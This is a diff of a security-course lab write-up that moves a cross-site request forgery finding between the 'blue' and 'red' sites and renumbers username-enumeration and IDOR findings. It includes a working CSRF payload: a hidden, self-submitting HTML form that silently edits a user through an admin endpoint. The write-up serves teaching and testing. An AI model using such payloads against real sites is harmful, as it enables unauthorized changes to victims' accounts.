@@ -69,9 +69,15 @@ Database: globitek_blue
 
 ![Gif of 5](https://github.com/jonkillinger/FacebookCyberSecurityCourseWeek8/blob/master/5.gif?raw=true)
 
-Vulnerability #2: IDOR
+Vulnerability #2: Cross Site Request Forgery
 
-GIF:
+    The blue site doesn't need a CSRF token to carry out admin-level work, such as editing a user's profile. By creating a hidden form that is automatically submitted (without notifying the user of submission results), we can be stealthy. For example, by using a hidden form which will not display submission results, we can send a POST request by linking it to a logged in admin. In this example, I've linked the malicious form to the admin through the "contact us" page.
+    
+    ```
+    <html><body onload="document.bank_form.submit()"><form action="https://35.184.242.122/red/public/staff/users/edit.php?id=4" method="POST" name="bank_form" style="display: none;" target="hidden_results" ><input type="text" name="first_name" value="MALICIOUSALTEREDVALUE"/><input type="text"/></form> <iframe name="hidden_results" style="display: none;"></iframe> </body> </html>
+    ```
+
+![Gif of 8](https://github.com/jonkillinger/FacebookCyberSecurityCourseWeek8/blob/master/8.gif?raw=true) 
 
 
 
@@ -96,24 +102,14 @@ Green site allows sessions to be a year old, and never regenerates the session I
 
 ## Red
 
-Vulnerability #1: Cross Site Request Forgery
-
-    The red site doesn't need a CSRF token to carry out admin-level work, such as editing a user's profile. By creating a hidden form that is automatically submitted (without notifying the user of submission results), we can be stealthy. For example, by using a hidden form which will not display submission results, we can send a POST request by linking it to a logged in admin. In this example, I've linked the malicious form to the admin through the "contact us" page.
-    
-    ```
-    <html><body onload="document.bank_form.submit()"><form action="https://35.184.242.122/red/public/staff/users/edit.php?id=4" method="POST" name="bank_form" style="display: none;" target="hidden_results" ><input type="text" name="first_name" value="MALICIOUSALTEREDVALUE"/><input type="text"/></form> <iframe name="hidden_results" style="display: none;"></iframe> </body> </html>
-    ```
-
-![Gif of 8](https://github.com/jonkillinger/FacebookCyberSecurityCourseWeek8/blob/master/8.gif?raw=true) 
-
-Vulnerability #2: Username Enumeration
+Vulnerability #1: Username Enumeration
 
     The red site is vulnerable to username enumeration, because attempting to login too many times will lock out the account from trying for x minutes. This is prompt confirms that the username exists in the system (accounts that do not exist will not throw this error message after 3 attempts)
 
 
 ![Gif of 7](https://github.com/jonkillinger/FacebookCyberSecurityCourseWeek8/blob/master/7.gif?raw=true)
 
-Vulnerability #3: IDOR
+Vulnerability #2: IDOR
 
 Able to access salespeople who have been fired or inactive. Simply altering the url for the id request of a salesperson will give anyone access to a page not desired to be shown.
 
